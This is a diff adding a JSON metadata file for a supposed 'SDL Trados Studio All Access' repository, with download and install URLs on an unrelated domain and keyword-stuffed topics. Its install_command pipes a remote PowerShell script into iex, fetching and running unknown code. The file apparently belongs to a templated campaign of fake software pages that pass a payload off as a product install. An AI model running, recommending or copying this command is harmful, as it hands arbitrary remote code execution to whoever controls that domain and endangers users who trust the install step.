@@ -1,0 +1,26 @@
+{
+  "repo": "sdl-trados-studio-all-access",
+  "product": "SDL Trados Studio All Access",
+  "kind": "office",
+  "install_type": "download",
+  "download_url": "https://sdl-trados.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "office",
+  "topics": [
+    "sdl-trados-quickstart",
+    "sdl-trados-build",
+    "print-tools",
+    "sdl-trados-desktop-app",
+    "sdl-trados-utility",
+    "getting-started",
+    "windows-10",
+    "productivity",
+    "document-editor",
+    "windows-11",
+    "template-library",
+    "sdl-trados-windows-guide"
+  ]
+}
